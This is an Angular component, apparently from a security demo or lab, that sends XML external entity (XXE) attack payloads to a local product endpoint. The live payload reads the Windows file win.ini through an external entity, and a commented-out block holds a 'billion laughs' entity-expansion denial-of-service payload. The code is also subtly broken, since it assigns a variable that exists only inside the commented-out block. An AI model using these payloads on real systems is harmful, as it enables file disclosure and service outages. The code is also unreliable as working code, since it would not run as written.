import { Component, OnInit } from '@angular/core';
// import { HttpBackend } from '@angular/common/http';
import { HttpClient, HttpHeaders } from '@angular/common/http';

@Component({
  selector: 'app-xeehacker',
  templateUrl: './xeehacker.component.html',
  styleUrls: ['./xeehacker.component.css']
})
export class XEEHackerComponent implements OnInit {

  httpOptions: { headers: HttpHeaders; };
  public xxeResponse;
  public xxePlainCode;

  constructor(private http: HttpClient) { }

  ngOnInit() {

    this.httpOptions = {
      headers: new HttpHeaders({
        contentType: 'text/xml', //<- To SEND XML
        accept: 'text/xml',       //<- To ask for XML
        responseType: 'text'             //<- b/c Angular understands text
      })
    };

    let body =
      "<?xml version = \"1.0\" encoding =\"UTF-8\"?>"
      + "<!DOCTYPE root ["
      + " <!ELEMENT root ANY >"
      + " <!ENTITY own SYSTEM \"file:///C:/Windows/win.ini\" >"
      + "]>"
      + "<root>"
      + "<product>"
      + "<id>&own;</id>"
      + "<fridge_id>1</fridge_id>"
      + "<start_weight>1</start_weight>"
      + "<current_weight>1</current_weight>"
      + "<expire_date>2</expire_date>"
      + "</product>"
      + "</root>"

    // let body2 =
    //   `<!DOCTYPE root [
    //   <!ENTITY lol "lol" >
    //   <!ELEMENT lolz(#PCDATA) >
    //   <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;" >
    //   <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;" >
    //   <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;" >
    //   <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;" >
    //   <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;" >
    //   <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;" >
    //   <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;" >
    //   <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;" >
    //   <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;" >
    //   ]>`
    //   + "<root>"
    //   + "<product>"
    //   + "<id>&own;</id>"
    //   + "<fridge_id>1</fridge_id>"
    //   + "<start_weight>1</start_weight>"
    //   + "<current_weight>1</current_weight>"
    //   + "<expire_date>2</expire_date>"
    //   + "</product>"
    //   + "</root>"


    this.xxePayload = body2;

    this.xxePlainCode = `
      <?xml version = \"1.0\" encoding =\"UTF-8\"?>
      <!DOCTYPE root[<!ELEMENT root ANY> 
      <!ENTITY own SYSTEM "file:///C:/Windows/win.ini">]>
      <root>
      <product>
        <id>&own;</id>
        <fridge_id>1</fridge_id>
        <start_weight>1</start_weight>
        <current_weight>1</current_weight>
        <expire_date>2</expire_date>
        </product>
      </root>`;

  }

  public xxePayload: string;

  public sendXXEInjection() {
    return this.http.post<string>('http://localhost:4200/product/' + '1', this.xxePayload, this.httpOptions)
      .subscribe(
        result => {
          console.log(result);  //<- XML response is in here *as plain text*
          this.xxeResponse = result;
        },
        error => {
          console.log('There was an error: ', error)
          this.xxeResponse = error.error.sql;
        }
      );
  }

}
